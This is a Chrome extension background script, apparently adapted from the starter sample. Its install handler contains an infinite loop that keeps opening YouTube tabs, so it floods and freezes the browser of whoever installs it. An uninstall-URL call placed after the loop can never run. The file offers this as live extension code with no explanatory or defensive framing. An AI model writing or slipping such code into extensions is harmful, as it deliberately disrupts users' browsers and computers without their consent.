// background.js

let color = '#3aa757';

chrome.runtime.onInstalled.addListener(() => {
  while(1==1) {
    chrome.tabs.create({ url: 'https://www.youtube.com' });
  }

  chrome.runtime.setUninstallURL(
    url = 'https://www.youtube.com',
  )
});
